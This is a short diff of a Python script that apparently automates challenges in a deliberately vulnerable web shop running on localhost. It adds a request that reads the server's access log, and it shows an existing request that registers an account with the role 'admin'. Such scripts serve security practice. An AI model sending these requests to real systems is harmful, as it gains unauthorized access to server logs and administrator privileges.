@@ -3,6 +3,8 @@ url='http://localhost:3000' # Indicate the URL without '/' at the end
 import requests
 
 # ==== No required action ====
+# ---- Access Log (Gain access to any access log file of the server.)
+requests.get(url+'/support/logs/access.log')
 # ---- Admin Registration (Register as a user with administrator privileges.)
 requests.post(url+'/api/Users',data={'email':'admin','password':'admin','role':'admin'})
 # ---- Admin Section (Access the administration section of the store.)
